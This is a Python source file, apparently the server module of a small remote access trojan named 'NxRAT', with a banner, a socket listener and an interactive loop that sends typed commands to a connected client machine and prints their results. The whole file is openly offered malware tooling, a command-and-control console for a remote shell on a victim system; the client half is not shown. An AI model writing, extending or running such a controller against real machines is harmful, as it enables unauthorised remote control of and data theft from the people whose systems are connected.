import os, sys, socket
from argparse import ArgumentParser as AP

'''
NxRAT server module - v1.0

~ Mach3306
'''

class MetaObject:
    
    banner_text = """
    
    ███╗░░██╗██╗░░██╗██████╗░░█████╗░████████╗
    ████╗░██║╚██╗██╔╝██╔══██╗██╔══██╗╚══██╔══╝
    ██╔██╗██║░╚███╔╝░██████╔╝███████║░░░██║░░░
    ██║╚████║░██╔██╗░██╔══██╗██╔══██║░░░██║░░░
    ██║░╚███║██╔╝╚██╗██║░░██║██║░░██║░░░██║░░░
    ╚═╝░░╚══╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░

    ~ A tiny server/client "RAT"...\n\n
    """
    
    @staticmethod
    def print_action_banner(*strings):
        for string in strings:
            print("\033[34m[*]\033[37m {}...\033[0m".format(string))
            
    @staticmethod
    def print_error_banner(*errors):
        for error in errors:
            print("\n\033[31m[X]\033[37m An error has occured: {}...\033[0m\n".format(error))
            
    @staticmethod
    def print_success_banner(*strings):
        for string in strings:
            print("\033[32m[+]\033[37m {}...\033[0m".format(string))
            
    @staticmethod
    def print_command_result(string):
        print("\033[33mCommand Result:\n\033[37m{}\033[0m".format(string))

class Server:
    
    def __init__(self, ip_address, port_number, timeout=5):
        self.ip = ip_address
        self.port = port_number
        self.timeout = timeout
        self.version = "1.0.0a"
        self.message = "V2VsY29tZSB0byBteSBoYWNrZXIgc2VydmVyLi4u"
        self.sock_addr = (self.ip, self.port)
        # Meta module
        self.hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
    def init_server(self):
        print("\033[31m{}\033[0m".format(MetaObject.banner_text))
        
        MetaObject.print_action_banner("Initialized program", "Binding: {} :: {}".format(self.ip, self.port))
        
        # Bind the socket address to the hacker socket
        try:
            self.hacker_socket.bind(self.sock_addr)
            
            MetaObject.print_action_banner("Bound server address", "Listen timeout is: {}".format(str(self.timeout)), "Listening for connections\n")
            
            self.hacker_socket.listen(self.timeout)
            
            # Accept connections from clients
            self.hacker_socket, client_address = self.hacker_socket.accept()
            
            MetaObject.print_success_banner("Connection established {} <-> {}, connection staged".format(self.ip, client_address))
            
            # Recieve sysname from remote client system
            sys_name = self.hacker_socket.recv(1024).decode()
            
            try:
                while True:
                    command = input("\nnxrat::{} > ".format(sys_name))
                    
                    # Send the command
                    self.hacker_socket.send(command.encode())
                    
                    if command == "exit":
                        MetaObject.print_action_banner("Closing connection to client"); self.hacker_socket.close(); break
                    
                    if command == "message":
                        MetaObject.print_command_result(self.hacker_socket.recv(10).decode()); continue
                        
                    # Recieve the results
                    cmd_result = self.hacker_socket.recv(1248).decode()
                    
                    MetaObject.print_command_result(cmd_result)
                    
            except Exception as e:
                MetaObject.print_error_banner(e); self.hacker_socket.close(); exit(1)
            
        except Exception as e:
            MetaObject.print_error_banner(e); self.hacker_socket.close(); exit(1)
            
        except KeyboardInterrupt:
            self.hacker_socket.close(); exit(0)

def main():
    par = AP(usage="python3 server.py -i <IP ADDRESS> -p <PORT> | -h, --help", conflict_handler="resolve")
    par.add_argument('-i', '--ip-address', dest="nx_server", type=str, metavar="", help="IP Address to bind.")
    par.add_argument('-p', '--port-number', dest="nx_port", type=int, metavar="", help="Port to bind to the server.")
    par.add_argument('-t', '--timeout', dest="nx_timeout", type=int, metavar="", help="Server listen timeout, default=5.")
    
    args = par.parse_args()
    
    # Objects
    server = Server(ip_address=args.nx_server, port_number=args.nx_port)
    
    if args.nx_server:
        server.init_server()
        

main()
